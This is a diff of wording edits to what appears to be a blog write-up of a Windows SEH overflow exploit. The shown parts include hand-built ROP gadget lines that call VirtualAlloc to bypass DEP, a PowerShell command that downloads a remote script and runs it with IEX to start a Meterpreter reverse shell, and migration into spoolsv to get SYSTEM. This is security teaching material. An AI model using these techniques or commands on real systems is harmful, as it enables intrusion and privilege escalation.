@@ -167,14 +167,14 @@ After that, we can confirm the crash again using the __!exchain__ command in win
 
 After the above is verified, we can check for bad characters. This way, we can avoid the use of them when sending our ROP-chain, the characters found were: 0x00, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20.
 
-So, what now, then? We need to defeat the next protection in our way [DEP](https://support.microsoft.com/en-us/topic/what-is-data-execution-prevention-dep-60dabc2b-90db-45fc-9b18-512419135817). We can use the good old __ROP__ for that. You can probably create a rop chain using something like __ropper__ or __mona__, but in many cases, I just create the chain myself. I just like to do things hard for me [uwu](https://dplastico.github.io/2023/03/23/doing-it-wrong-Apocalypse_2023_ctf.html)
+So, what now? We need to defeat the next protection in our way [DEP](https://support.microsoft.com/en-us/topic/what-is-data-execution-prevention-dep-60dabc2b-90db-45fc-9b18-512419135817). We can use the good old __ROP__ for that. We can probably create a rop chain using something like __ropper__ or __mona__, but in many cases, I just create the chain myself. I just like to do things hard for me [uwu](https://dplastico.github.io/2023/03/23/doing-it-wrong-Apocalypse_2023_ctf.html)
 
-Ok, we should collect gadgets at this point to start _roping_, I used __ropper__, which runs on Kali, what I was using at the moment, and since we need an offset to the base address, it is important to pass the parameter __-I 0x0__ to ropper, this way the addresses will not contain the preferred base address as the base address, and we will have just the offsets.
+Ok, we should collect gadgets at this point to start _ropping_, I used __ropper__, which runs on Kali, what I was using at the moment, and since we need an offset to the base address, it is important to pass the parameter __-I 0x0__ to ropper, this way the addresses will not contain the preferred base address as the base address, and we will have just the offsets.
 
 After collecting gadgets, let's start creating our rop-chain.
 
 
-Ok, but wait... This is a SEH overflow, so we cannot just go into "mordor" and start ropping.
+Ok, but wait... This is a SEH overflow, so we cannot just go into "Mordor" and start ropping.
 
 ![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-21-36-57.png)
 
@@ -325,7 +325,7 @@ rop += p32(0x41424344) #junk for EBP
 rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;
 ```
 
-Great, we add the value first, passing the value of _ECX_ to _EAX_ and then doing a negative subtraction, again to avoid NULL bytes. We should increase the stub-pointer after that
+Great, we add the value first, passing the value of _ECX_ to _EAX_ and then doing a negative subtraction, again to avoid NULL bytes. We should increase the stub-pointer after.
 
 ```python
 rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
@@ -334,7 +334,7 @@ rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
 rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
 ```
 
-Now it's time to set up the _lpAddress_ parameter of VirtualAlloc, and since this should be the same value we calculated before, we can just do the same this time. We will subtract 0x3f0-4 to compensate for this (since we increased the stub-pointer by 4)
+Now it's time to set up the _lpAddress_ parameter of VirtualAlloc, and since this should be the same value we calculated before, we can just do the same this time. We will subtract 0x3f0-4 to compensate for this (since we increased the stub-pointer by 4).
 
 ```python
 rop += p32(filesrv+0x0003e7d2) # mov eax, ecx; ret;
@@ -371,7 +371,7 @@ rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
 rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
 rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
 ```
-Let's set up now the _flAllocationType_ argument to 0x1000. Nothing fancy here. Just the same we are doing  negating the value and then increasing it (to avoid NULL and/or badchars)
+Let's set up now the _flAllocationType_ argument to 0x1000. Nothing fancy here. Just the same we are doing  negating the value and then increasing it. (to avoid NULL and/or badchars)
 
 ```python
 rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
@@ -529,7 +529,7 @@ C:\shared>
 ```
 We can observe we have a high-integrity shell, and we are part of NT AUTHORITY. So after all that ropping, I went the easy way and first called a PowerShell reverse_shell and generate a 32-bit meterpreter shell  (remember, we are running on an x86 process).
 
-We then can host the shell in a Python web server and execute PowerShell in pour shell and download and execute the meterpreter reverse shell with 
+We then can host the shell in a Python web server and execute PowerShell in our shell and download and execute the meterpreter reverse shell with the followign command
 
 ```
 (new-object system.net.webclient).DownloadString('http://10.8.0.138/dplashell.txt') | IEX
@@ -538,7 +538,7 @@ Now we got a meterpreter session.
 
 ![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-19-40-40.png)
 
-Getting SYSTEM is now trivial. We can just migrate to a SYSTEM process. We can enumerate them with the _ps_ command. I choose the _spoolsv_ process, and we can use the __migrate__ command in Metasploit to accomplish this.
+Getting SYSTEM is now trivial. We can just migrate to a SYSTEM process, like the _spoolsv_ process, and use the __migrate__ command in Metasploit to accomplish this.
 
 ![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-19-44-42.png)
 
